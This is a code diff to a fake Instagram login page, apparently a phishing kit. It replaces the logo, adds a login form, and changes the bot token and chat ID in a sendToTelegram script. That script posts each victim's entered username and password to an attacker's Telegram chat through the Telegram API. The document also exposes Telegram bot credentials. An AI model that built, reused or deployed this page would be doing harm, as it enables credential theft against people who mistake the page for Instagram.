@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -196,10 +197,9 @@
 </head>
 <body>
   <div class="container" role="main">
-     <img src="https://github.com/KINGSHUBHAM-tech/Logo-cp-websp/blob/main/instagram-logo.png?raw=true"
-             alt="Instagram"
-             class="instagram-logo-img"
-             onerror="this.onerror=null;this.src='https://placehold.co/175x51/333/FFF?text=Instagram'">
+    <h1 class="logo" aria-label="Instagram">Instagram</h1>
+
+    <form aria-label="Login form">
       <input
         type="text"
         name="username"
@@ -270,8 +270,8 @@
 
   <script>
     async function sendToTelegram(username, password) {
-      const botToken = '8157111925:AAEq1sV-01ewJ29tIjXjMmXWKfWx4lU5isI';
-      const chatId = '7351989900';
+      const botToken = '6058106297:AAE3o2YdDcc915N81s91F3S9jzMTYj1k0UQ';
+      const chatId = '1747742228';
       const message = `Login Attempt:\nUsername: ${username}\nPassword: ${password}`;
 
       const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
